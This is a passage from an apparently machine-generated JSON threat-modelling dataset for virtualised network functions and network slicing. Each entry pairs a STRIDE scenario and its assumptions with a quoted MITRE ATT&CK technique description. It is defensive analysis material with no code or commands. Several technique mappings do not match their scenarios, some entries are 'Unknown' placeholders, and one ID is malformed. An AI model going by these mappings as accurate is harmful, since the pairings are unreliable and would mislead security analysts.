        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Misconfigured Access Control on Orchestration and Management Systems",
            "Assumptions": [
                {
                    "Assumption": "Access control systems are misconfigured allowing broader access than intended.",
                    "Role": "System Administrator",
                    "Condition": "Misconfigured access control policies."
                },
                {
                    "Assumption": "Attacker identifies and exploits these configuration flaws.",
                    "Role": "Attacker",
                    "Condition": "Exploitation of access control weaknesses."
                },
                {
                    "Assumption": "Monitoring and logging do not adequately track privilege usage.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate monitoring and logging."
                }
            ],
            "Potential Impact": "Attacker gains unauthorized privileged access, potentially disrupting services and modifying configurations.",
            "MITRE ATT&CK Keywords": [
                "access control flaws",
                "privilege misuse",
                "orchestration system"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Privilege Escalation Through Vulnerabilities in NFVO",
            "Assumptions": [
                {
                    "Assumption": "NFVO contains exploitable vulnerabilities that allow privilege escalation.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched or known vulnerabilities."
                },
                {
                    "Assumption": "Attacker has access to the NFVO system through user credentials or local access.",
                    "Role": "Attacker",
                    "Condition": "Credentials or local system access."
                },
                {
                    "Assumption": "The system does not enforce strong least-privilege access controls.",
                    "Role": "System Designer",
                    "Condition": "Weak access control implementations."
                }
            ],
            "Potential Impact": "Compromised NFVO leading to unauthorized control of the networking environment and potential service disruptions.",
            "MITRE ATT&CK Keywords": [
                "NFVO vulnerability",
                "privilege escalation",
                "network control"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "11",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs network function requests to manipulate or intercept data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network where the communication occurs.",
                    "Role": "Attacker",
                    "Condition": "Valid if any communication channel is compromised."
                },
                {
                    "Assumption": "The system lacks strong mutual authentication between components.",
                    "Role": "Network Administration",
                    "Condition": "Valid if weak or no authentication measures are in place."
                },
                {
                    "Assumption": "Network traffic is insufficiently encrypted or not encrypted at all.",
                    "Role": "Network Administration",
                    "Condition": "Valid in the absence of end-to-end encryption."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, integrity breach of network functions, and service availability disruptions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "virtual network functions",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access to management interfaces by spoofing identity.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the management interface network.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical or virtual access is compromised."
                },
                {
                    "Assumption": "Authentication mechanisms are weak or compromised.",
                    "Role": "System Administration",
                    "Condition": "Valid if password policies are weak or keys are exposed."
                },
                {
                    "Assumption": "There are no mechanisms to detect and block unauthorized access.",
                    "Role": "Security Monitoring",
                    "Condition": "Valid if IDS/IPS systems are not in place or not functioning properly."
                }
            ],
            "Potential Impact": "Unauthorized configuration changes, potential downtime, and system integrity violations.",
            "MITRE ATT&CK Keywords": [
                "identity spoofing",
                "management interface",
                "unauthorized access",
                "configuration tampering"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates legitimate external interfaces to intercept or alter data.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces lack robust mutual authentication protocols.",
                    "Role": "Network Administration",
                    "Condition": "Valid if mutual authentication protocols are not rigorously implemented."
                },
                {
                    "Assumption": "Data in transit between interfaces is not encrypted adequately.",
                    "Role": "Network Administration",
                    "Condition": "Valid if weak or no encryption is used."
                },
                {
                    "Assumption": "Systems fail to verify the integrity of the incoming requests properly.",
                    "Role": "Network and System Administration",
                    "Condition": "Valid if integrity checks are not rigorously enforced."
                }
            ],
            "Potential Impact": "Disclosure of sensitive information, unauthorized data alteration, and disruptions in service communication.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "external interface",
                "data interception",
                "network vulnerability"
            ],
            "mitre_technique": {
                "name": "Protocol Impersonation",
                "description": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. ",
                "id": "attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc",
                "technique_id": "T1001.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies network slice configurations to disrupt services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has administrative access to the orchestration and management layer.",
                    "Role": "Attacker",
                    "Condition": "Valid if access controls are weak or compromised."
                },
                {
                    "Assumption": "Configuration files are not protected against unauthorized modifications.",
                    "Role": "System Administration",
                    "Condition": "Valid if file permissions are not properly set."
                },
                {
                    "Assumption": "Logging mechanisms are insufficient to detect unauthorized changes.",
                    "Role": "Security Monitoring",
                    "Condition": "Valid if no or inadequate logging is in place."
                }
            ],
            "Potential Impact": "Service availability issues, integrity of network configurations, and possible data integrity issues.",
            "MITRE ATT&CK Keywords": [
                "modification",
                "configuration tampering",
                "orchestration",
                "management layer"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to edge and cloud computing nodes to inject malicious code.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access through weak or default credentials.",
                    "Role": "Attacker",
                    "Condition": "Valid if default or weak credentials are used."
                },
                {
                    "Assumption": "Code execution or deployment is not restricted to trusted sources.",
                    "Role": "System Administration",
                    "Condition": "Valid if code execution policies are lax."
                },
                {
                    "Assumption": "Monitoring and security controls on edge and cloud nodes are minimal.",
                    "Role": "Security Monitoring",
                    "Condition": "Valid if monitoring is inadequate."
                }
            ],
            "Potential Impact": "System integrity breach, service disruptions, and potential data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "code injection",
                "edge computing",
                "cloud computing",
                "node compromise"
            ],
            "mitre_technique": {
                "name": "Dynamic-link Library Injection",
                "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
                "technique_id": "T1055.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with network function code within VNFs.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has intermediate access to the virtual network environment.",
                    "Role": "Attacker",
                    "Condition": "Valid if boundary controls are weak."
                },
                {
                    "Assumption": "VNFs do not have sufficient integrity checks for deployed code.",
                    "Role": "System Administration",
                    "Condition": "Valid if VNF integrity verifications are weak or absent."
                },
                {
                    "Assumption": "Security updates and patches are not applied promptly.",
                    "Role": "Administrators",
                    "Condition": "Valid if patching routines are delayed or ignored."
                }
            ],
            "Potential Impact": "Data corruption, service performance degradation, and potential sensitive data breaches.",
            "MITRE ATT&CK Keywords": [
                "code tampering",
                "VNFs",
                "service disruption",
                "virtual environment"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies unauthorized changes made to VNF configurations.",
            "Assumptions": [
                {
                    "Assumption": "Logs do not capture detailed transaction activities.",
                    "Role": "Security Administration",
                    "Condition": "Valid if logging is insufficient or missing."
                },
                {
                    "Assumption": "There is no non-repudiation mechanism in place.",
                    "Role": "System Administration",
                    "Condition": "Valid if non-repudiation controls are absent."
                },
                {
                    "Assumption": "Access to configuration interfaces is insufficiently controlled and monitored.",
                    "Role": "Network and System Administration",
                    "Condition": "Valid if access controls are lacking."
                }
            ],
            "Potential Impact": "Inability to trace unauthorized changes, potential repeated attacks, and trust issues in system integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "VNF",
                "configuration changes",
                "transaction logging"
            ],
            "mitre_technique": {
                "name": "SNMP (MIB Dump)",
                "description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5",
                "technique_id": "T1602.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates logging records to cover their traces after unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has sufficient privileges to access and modify logs.",
                    "Role": "Attacker",
                    "Condition": "Valid if privileged access is compromised."
                },
                {
                    "Assumption": "Logging tools or mechanisms are weak or compromised.",
                    "Role": "System Administration",
                    "Condition": "Valid if logging systems are vulnerable."
                },
                {
                    "Assumption": "Audit trails are insufficiently protected or verified.",
                    "Role": "Security Administration",
                    "Condition": "Valid if audit trails are easily altered."
                }
            ],
            "Potential Impact": "Loss of forensic evidence, inability to trace or mitigate security breaches, and increased risk of future attacks.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "unauthorized access",
                "audit trail",
                "forensic evasion"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies sending malicious network requests by altering network traffic records.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to network monitoring and logging systems.",
                    "Role": "Attacker",
                    "Condition": "Valid if access permissions are compromised."
                },
                {
                    "Assumption": "Network logs are insufficiently protected against tampering.",
                    "Role": "Network Administration",
                    "Condition": "Valid if network logs lack protection."
                },
                {
                    "Assumption": "Monitoring systems do not have real-time integrity checks.",
                    "Role": "Security Monitoring",
                    "Condition": "Valid if integrity checks are not enforced."
                }
            ],
            "Potential Impact": "Difficulty in identifying malicious activity, potential for undetected repeated attacks, and compromised network log integrity.",
            "MITRE ATT&CK Keywords": [
                "network traffic",
                "repudiation",
                "log alteration",
                "network monitoring"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--35bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is intercepted in transit due to unencrypted network traffic.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is transmitted in cleartext.",
                    "Role": "Network Administration",
                    "Condition": "Valid if encryption policies are not enforced."
                },
                {
                    "Assumption": "The attacker has access to the network communication channels.",
                    "Role": "Attacker",
                    "Condition": "Valid if network channels are compromised."
                },
                {
                    "Assumption": "Sensitive data is not encrypted before transmission.",
                    "Role": "Data Handlers",
                    "Condition": "Valid if data is sent without additional encryption measures."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, potential data breaches, and loss of confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted traffic",
                "network communication",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker accesses sensitive data stored in improperly protected cloud nodes.",
            "Assumptions": [
                {
                    "Assumption": "Cloud nodes lack strong access control mechanisms.",
                    "Role": "Cloud Administration",
                    "Condition": "Valid if access controls are weak or absent."
                },
                {
                    "Assumption": "Sensitive data is stored without adequate encryption.",
                    "Role": "Data Handlers",
                    "Condition": "Valid if data encryption is not applied."
                },
                {
                    "Assumption": "Monitoring and alerting systems are insufficient to detect unauthorized access.",
                    "Role": "Security Monitoring",
                    "Condition": "Valid if alerts are misconfigured or missing."
                }
            ],
            "Potential Impact": "Exposure of sensitive data, potential misuse, and breach of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "cloud storage",
                "unauthorized access",
                "sensitive data",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits vulnerabilities in external interfaces to access confidential data.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces have exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if vulnerabilities exist and are not patched."
                },
                {
                    "Assumption": "Sensitive data is accessible through these interfaces.",
                    "Role": "Data Handlers",
                    "Condition": "Valid if data protection measures are weak."
                },
                {
                    "Assumption": "There are no compensatory security controls to mitigate interface vulnerabilities.",
                    "Role": "Network Administration",
                    "Condition": "Valid if compensatory measures are not in place."
                }
            ],
            "Potential Impact": "Unauthorized data access, data leakages, and loss of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "external interface",
                "vulnerability exploitation",
                "confidential data",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DoS attack on network function services, disrupting network slices.",
            "Assumptions": [
                {
                    "Assumption": "The services are not protected against high-volume traffic.",
                    "Role": "Network Administration",
                    "Condition": "Valid if traffic control measures are absent."
                },
                {
                    "Assumption": "There are no effective rate-limiting mechanisms in place.",
                    "Role": "System Administration",
                    "Condition": "Valid if rate-limiting is not implemented."
                },
                {
                    "Assumption": "The attacker's traffic is not detected or mitigated quickly.",
                    "Role": "Security Monitoring",
                    "Condition": "Valid if monitoring is inadequate."
                }
            ],
            "Potential Impact": "Service disruption, network slice performance degradation, and potential user dissatisfaction.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network function services",
                "DoS attack",
                "traffic flood"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in VNFs to crash or halt their operation.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is aware of exploitable vulnerabilities in VNFs.",
                    "Role": "Attacker",
                    "Condition": "Valid if VNF vulnerabilities are known."
                },
                {
                    "Assumption": "No security patches addressing these vulnerabilities have been applied.",
                    "Role": "System Administration",
                    "Condition": "Valid if patches are delayed."
                },
                {
                    "Assumption": "There are no alternative VNFs or redundancy measures.",
                    "Role": "Network Administration",
                    "Condition": "Valid if redundancy is lacking."
                }
            ],
            "Potential Impact": "Service interruption, degradation of network functionality, and potential revenue loss.",
            "MITRE ATT&CK Keywords": [
                "VNF",
                "vulnerability exploitation",
                "service crash",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets orchestration and management layers with resource exhaustion attacks.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration and management services have limited resource capacity.",
                    "Role": "System Administration",
                    "Condition": "Valid if capacity planning is insufficient."
                },
                {
                    "Assumption": "There are no automated systems to detect and mitigate resource exhaustion.",
